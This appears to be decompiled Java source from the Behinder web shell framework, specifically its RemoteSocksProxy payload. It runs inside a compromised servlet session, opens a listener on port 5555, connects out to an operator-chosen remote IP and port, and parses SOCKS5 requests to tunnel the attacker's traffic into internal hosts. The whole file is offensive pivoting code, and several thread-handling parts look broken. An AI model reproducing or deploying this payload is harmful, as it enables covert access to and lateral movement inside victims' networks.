package net.rebeyond.behinder.payload.java;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.channels.SocketChannel;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import net.rebeyond.behinder.utils.CipherUtils;

public class RemoteSocksProxy implements Runnable {
   public static String action;
   public static String remoteIP;
   public static String remotePort;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   private Socket outerSocket;
   private Socket innerSocket;
   private Socket serverInnersocket;
   private Socket targetSocket;
   private int listenPort = 5555;
   private String threadType;
   private int bufSize = 65535;

   public RemoteSocksProxy(Socket socket, String threadType, HttpSession session) {
      this.outerSocket = socket;
      this.threadType = threadType;
      this.Session = session;
   }

   public RemoteSocksProxy(String threadType, HttpSession session) {
      this.threadType = threadType;
      this.Session = session;
   }

   public RemoteSocksProxy(Socket outerSocket, String threadType, Socket innerSocket) {
      this.outerSocket = outerSocket;
      this.innerSocket = innerSocket;
      this.threadType = threadType;
   }

   public RemoteSocksProxy() {
   }

   public boolean equals(Object obj) {
      return false;
   }

   public void run() {
      if (action.equals("create")) {
         try {
            ServerSocket serverSocket = new ServerSocket(this.listenPort, 50);
            this.Session.setAttribute("socks_server_" + this.listenPort, serverSocket);
            serverSocket.setReuseAddress(true);
            (new Thread(new RemoteSocksProxy("link", this.Session))).start();

            while(true) {
               Socket serverInnersocket = serverSocket.accept();
               this.Session.setAttribute("socks_server_inner_" + serverInnersocket.getInetAddress().getHostAddress() + "_" + serverInnersocket.getPort(), serverInnersocket);
               (new Thread(new RemoteSocksProxy(serverInnersocket, "session", this.Session))).start();
            }
         } catch (IOException var12) {
         }
      }

      if (action.equals("link")) {
         try {
            SocketChannel outerSocketChannel = SocketChannel.open();
            outerSocketChannel.connect(new InetSocketAddress(remoteIP, Integer.parseInt(remotePort)));
            String outerKey = "socks_outer_" + outerSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort;
            this.Session.setAttribute(outerKey, outerSocketChannel);
            SocketChannel innerSocketChannel = SocketChannel.open();
            innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", this.listenPort));
            String innerKey = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
            this.Session.setAttribute(innerKey, innerSocketChannel);
         } catch (IOException var8) {
         }
      } else if (action.equals("session")) {
         try {
            if (this.handleSocks(this.serverInnersocket)) {
               Thread reader = new Thread(new RemoteSocksProxy(this.serverInnersocket, "read", this.Session));
               reader.start();
               Thread writer = new Thread(new RemoteSocksProxy(this.serverInnersocket, "write", this.Session));
               writer.start();
               reader.start();
               writer.start();
               reader.join();
               writer.join();
            }
         } catch (Exception var7) {
            var7.printStackTrace();
         }
      } else {
         byte[] buf;
         int length;
         if (!action.equals("read")) {
            if (action.equals("write")) {
               while(this.outerSocket != null) {
                  try {
                     this.outerSocket.setSoTimeout(1000);
                     buf = new byte[this.bufSize];
                     length = this.outerSocket.getInputStream().read(buf);
                     if (length == -1) {
                        break;
                     }

                     this.innerSocket.getOutputStream().write(buf, 0, length);
                     this.innerSocket.getOutputStream().flush();
                  } catch (SocketTimeoutException var9) {
                  } catch (Exception var10) {
                     var10.printStackTrace();
                     break;
                  }
               }

               try {
                  this.innerSocket.close();
                  this.outerSocket.close();
               } catch (Exception var5) {
                  var5.printStackTrace();
               }
            }
         } else {
            while(this.outerSocket != null) {
               try {
                  buf = new byte[512];

                  for(length = this.innerSocket.getInputStream().read(buf); length > 0; length = this.innerSocket.getInputStream().read(buf)) {
                     this.outerSocket.getOutputStream().write(buf, 0, length);
                     this.outerSocket.getOutputStream().flush();
                  }
               } catch (Exception var11) {
                  var11.printStackTrace();
               }

               try {
                  this.innerSocket.close();
                  this.outerSocket.close();
               } catch (Exception var6) {
                  var6.printStackTrace();
               }
            }
         }
      }

   }

   private boolean handleSocks(Socket socket) throws Exception {
      int ver = socket.getInputStream().read();
      if (ver == 5) {
         return this.parseSocks5(socket);
      } else {
         return ver == 4 ? this.parseSocks4(socket) : false;
      }
   }

   private boolean parseSocks5(Socket socket) throws Exception {
      DataInputStream ins = new DataInputStream(socket.getInputStream());
      DataOutputStream os = new DataOutputStream(socket.getOutputStream());
      int nmethods = ins.read();
      int methods = ins.read();
      os.write(new byte[]{5, 0});
      int version = ins.read();
      int cmd;
      int rsv;
      int atyp;
      if (version == 2) {
         version = ins.read();
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      } else {
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      }

      byte[] targetPort = new byte[2];
      String host = "";
      byte[] target;
      if (atyp == 1) {
         target = new byte[4];
         ins.readFully(target);
         ins.readFully(targetPort);
         String[] tempArray = new String[4];

         int temp;
         for(int i = 0; i < target.length; ++i) {
            temp = target[i] & 255;
            tempArray[i] = temp + "";
         }

         String[] var22 = tempArray;
         temp = tempArray.length;

         for(int var17 = 0; var17 < temp; ++var17) {
            String tempstr = var22[var17];
            host = host + tempstr + ".";
         }

         host = host.substring(0, host.length() - 1);
      } else if (atyp == 3) {
         int targetLen = ins.read();
         target = new byte[targetLen];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      } else if (atyp == 4) {
         target = new byte[16];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      }

      int port = (targetPort[0] & 255) * 256 + (targetPort[1] & 255);
      if (cmd != 2 && cmd != 3) {
         if (cmd == 1) {
            host = InetAddress.getByName(host).getHostAddress();

            try {
               SocketChannel targetSocketChannel = SocketChannel.open();
               targetSocketChannel.connect(new InetSocketAddress(host, port));
               String innerKey = "socks_target_" + targetSocketChannel.socket().getLocalPort() + "_" + host + "_" + port;
               this.Session.setAttribute(innerKey, targetSocketChannel);
               os.write(CipherUtils.mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               return true;
            } catch (Exception var19) {
               os.write(CipherUtils.mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               throw new Exception(String.format("[%s:%d] Remote failed", host, port));
            }
         } else {
            throw new Exception("Socks5 - Unknown CMD");
         }
      } else {
         throw new Exception("not implemented");
      }
   }

   private boolean parseSocks4(Socket socket) {
      return false;
   }
}
